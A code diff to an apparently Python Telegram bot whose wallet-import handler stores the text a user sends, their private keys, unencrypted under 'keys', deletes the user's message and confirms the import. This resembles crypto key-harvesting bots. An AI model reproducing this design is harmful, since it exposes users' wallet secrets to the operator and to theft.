@@ -111,11 +111,27 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     text = update.message.text
+    message_id = update.message.message_id
+    chat_id = update.message.chat_id
+
     if user_id in waiting_for_import:
+        # Save the key
         users[user_id] = users.get(user_id, {})
         users[user_id]["keys"] = text
         waiting_for_import.discard(user_id)
-        await update.message.reply_text("✅ Wallet imported successfully.", reply_markup=main_menu())
+
+        # Delete the user's sensitive message
+        try:
+            await context.bot.delete_message(chat_id=chat_id, message_id=message_id)
+        except Exception as e:
+            print(f"Could not delete message: {e}")
+
+        # Send clean confirmation
+        await context.bot.send_message(
+            chat_id=chat_id,
+            text="✅ Wallet imported successfully.",
+            reply_markup=main_menu()
+        )
 
 async def admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id not in ADMIN_IDS:
